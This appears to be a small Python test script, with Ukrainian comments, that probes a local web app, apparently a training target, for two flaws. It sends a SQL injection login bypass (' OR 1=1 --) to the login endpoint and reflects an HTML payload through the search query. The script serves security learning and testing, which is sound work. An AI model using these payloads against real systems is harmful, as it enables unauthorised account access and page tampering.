import requests

BASE_URL = "http://localhost:3000"

def test_sql_injection_login():
    print("--- SQL інджекшн ---")
    login_url = f"{BASE_URL}/rest/user/login"

    # логін з інджкшном
    payload = {
        "email": "' OR 1=1 --",
        "password": "random_password"
    }

    response = requests.post(login_url, json=payload)

    if response.status_code == 200 and "token" in response.text:
        print("SQL-ін'єкція пройшла")
    else:
        print("система захищена від базової скюл інджектшн на логін")

def test_html_injection_search():
    print("--- HTML інджекшн хедера ---")

    # зрендерити заголовок через пошук
    payload = "<h1>hehehe u got hacked</h1>"
    search_url = f"{BASE_URL}/rest/products/search?q={payload}"

    response = requests.get(search_url)

    if payload in response.text:
        print(f"вразлисвість є!! HTML вдалось модифікувати")
        print(f"   пейлоад у відповіді: {payload}")
    else:
        print("блін, система захищена від цього((")
if __name__ == "__main__":
    test_sql_injection_login()
    test_html_injection_search()